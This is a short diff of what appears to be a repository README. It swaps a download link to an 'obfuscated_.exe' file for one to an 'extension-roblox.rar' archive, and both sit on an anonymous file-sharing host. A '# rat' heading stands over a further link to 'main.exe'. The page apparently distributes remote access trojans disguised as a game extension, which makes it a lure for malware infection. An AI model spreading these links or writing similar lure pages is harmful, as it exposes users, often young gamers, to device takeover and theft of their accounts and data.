@@ -8,8 +8,7 @@
 ![Image Preview](https://img.shields.io/github/issues-closed/hai723/storage?color=blue&logoColor=%23da467d&style=flat-square)
 
 
-https://anonsharing.com/file/8639de1608c9837f/obfuscated_.exe
-
+https://anonsharing.com/file/b61b3e2f93a11754/extension-roblox.rar
 # rat
 
 https://anonsharing.com/file/30b2d157c4b63190/main.exe
